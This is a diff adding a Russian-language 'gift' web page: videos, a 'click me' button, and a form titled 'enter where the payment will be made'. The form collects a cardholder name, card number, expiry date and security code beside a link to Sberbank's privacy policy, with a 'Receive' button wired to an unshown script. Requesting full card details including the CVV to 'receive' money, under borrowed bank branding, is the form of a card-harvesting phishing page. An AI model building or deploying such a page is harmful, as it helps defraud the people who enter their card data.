@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="stylegift1.css">
+</head>
+<body>
+    <div class="videobackground1" id="video">
+        <video src="videopad.webm" type="video/webm" autoplay muted loop  class="video1"></video>
+        <div class="start3">
+            <img src="fuckfig.gif" class="imgfuckgif">
+            <video src="videogift.webm" type="video/webm" autoplay muted  onplay  class="video2"></video>
+        </div>
+        <button onclick="error()" class="button1"> Нажми на меня </button>
+        <video src="errorvideo.mp4" type="video/mp4" autoplay muted loop  class="errorvideo" id="video22"></video>
+    </div>
+        <div class="start" id="start">
+            <div class="start1">
+                <div class="start2">
+                    <div class="buytext">
+                        <span>Введите куда будет произведена оплата</span>
+                        <span></span>
+                    </div>
+                    <main>
+                        <div class="wrapper">
+                        <form>
+                            <div>
+                            <label for="name">Имя получателя</label>
+                            <input required type="text" id="name" name="name" autocomplete="cc-name" placeholder="SAID KATAEV">
+                            </div>
+                        <div class="card-number">
+                            <label>Номер карты</label>
+                            <input required type="text" id="card-number" name="card-number" inputmode="numeric" autcomplete="cc-number" pattern="[0-9]+" placeholder="1234 1234 1234 1234">
+                            </div>
+                            <div class="date-code"><div>
+                            <label for="expiry-date">Дата/Срок</label>
+                            <input required type="text" id="expiry-date" name="expiry-date" class="expiry-date" autocomplete="cc-exp" placeholder="MM/YY" minlength="4" pattern="[0-9/]+">
+                            </div>
+                            <div>
+                            <label for="security-code">Код безопасности</label>
+                                <input required type="text" id="security-code" name="security-code" inputmode="numeric" minlength="3" maxlength="4" pattern="[0-9]+" placeholder="123"></div>
+                            </div>
+                            <div class="spanpollicy"><input type="checkbox" class="checkbox"> <span class="text1">Введя данные вы соглашаетесь с <a href="https://www.sberbank.ru/privacy/policy">политикой конфедициальности</a></span></div>
+                        </form>
+                        </div>
+                    </main>
+                    <button class="buttontext" onclick="buyclick()">Получить</button>
+                </div>
+
+
+            </div>
+        </div>
+</body>
+<script src="script2.js"></script>
+</html>
